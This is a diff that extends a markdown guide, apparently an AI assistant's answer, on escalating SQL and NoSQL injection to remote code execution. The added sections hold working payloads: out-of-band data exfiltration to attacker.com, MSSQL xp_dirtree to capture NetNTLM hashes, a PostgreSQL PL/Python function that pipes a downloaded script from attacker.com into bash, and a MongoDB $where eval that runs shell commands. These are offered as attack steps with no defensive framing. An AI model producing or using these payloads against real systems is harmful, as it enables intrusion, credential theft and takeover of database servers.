@@ -290,7 +290,68 @@ If you have **SQL Injection (SQLi)**, there are multiple ways to escalate it to 
 | Oracle    | `DBMS_SCHEDULER`, Java Stored Procedures |
 | SQLite    | Limited, but can be exploited via LFI |
 
-These are the primary techniques. If you have a specific target in mind, let me know so we can refine the approach! 🔥
+## **6. Exploiting Out-of-Band (OOB) Interactions**
+Some databases support **HTTP/DNS requests**, which can be used to exfiltrate data or even execute commands.
+
+### **A) MySQL & PostgreSQL - DNS Exfiltration**
+- Sending data to an attacker-controlled DNS server:
+  ```sql
+  SELECT LOAD_FILE(CONCAT('\\attacker.com\', (SELECT user())));
+  ```
+- Using `dblink` in PostgreSQL:
+  ```sql
+  SELECT dblink_connect('host=attacker.com user=postgres password=secret');
+  ```
+
+---
+
+## **7. Exploiting Database-Specific Features**
+### **A) MSSQL - Using `xp_dirtree` for SMB Authentication Capture**
+- `xp_dirtree` can force the server to authenticate via **NTLM**, allowing attackers to steal **NetNTLM hashes**:
+  ```sql
+  EXEC master.dbo.xp_dirtree '\\attacker.com\test';
+  ```
+- The captured hash can then be cracked using **hashcat**.
+
+### **B) PostgreSQL - Writing Malicious Functions**
+- If you have **superuser** privileges, you can create a malicious function to execute system commands:
+  ```sql
+  CREATE FUNCTION exec_cmd(text) RETURNS void AS $$
+    import os
+    os.system('curl http://attacker.com/shell.sh | bash')
+  $$ LANGUAGE plpythonu;
+  SELECT exec_cmd('whoami');
+  ```
+
+---
+
+## **8. Exploiting SQLi to Pivot to Other Services**
+Sometimes the primary goal is lateral movement within the network, such as:
+- **Extracting stored credentials** from the database.
+- **Interacting with other systems** using internal functions like HTTP requests or database links.
+- **Setting up tunneling** via SQL injection.
+
+---
+
+## **9. NoSQL Injection & RCE**
+If targeting **NoSQL databases** like **MongoDB** or **CouchDB**, different methods can be used:
+
+### **A) MongoDB - Executing JavaScript inside Queries**
+```js
+  db.collection.find({ $where: "function() { return eval('process.mainModule.require(\"child_process\").exec(\"whoami\")'); }" });
+```
+
+### **B) CouchDB - Arbitrary Command Execution**
+- CouchDB's API sometimes allows **arbitrary command execution** if not properly secured.
+
+---
+
+## **10. Second-Order SQL Injection Leading to RCE**
+- This occurs when **malicious data is stored in the database and later executed** with higher privileges, such as:
+  - Injecting SQL payloads that affect **backup or restore processes**.
+  - Exploiting stored data that is **executed dynamically** within linked applications.
+
+---
 
 
 ```bash
